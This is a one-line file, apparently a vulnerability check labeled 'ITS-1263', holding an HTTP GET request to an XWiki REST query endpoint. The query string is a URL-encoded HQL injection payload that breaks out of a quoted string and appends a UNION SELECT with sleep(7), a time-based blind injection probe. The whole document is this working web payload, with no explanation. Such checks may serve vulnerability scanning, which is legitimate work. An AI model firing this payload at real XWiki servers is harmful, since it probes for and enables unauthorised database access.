# Vulnerable: ITS-1263
GET /rest/wikis/xwiki/query?q=where%20doc.name=length(%27a%27)*org.apache.logging.log4j.util.Chars.SPACE%20or%201%3C%3E%271%5C%27%27%20union%20select%201,2,3,sleep(7)%20%23%27&type=hql&distinct=0
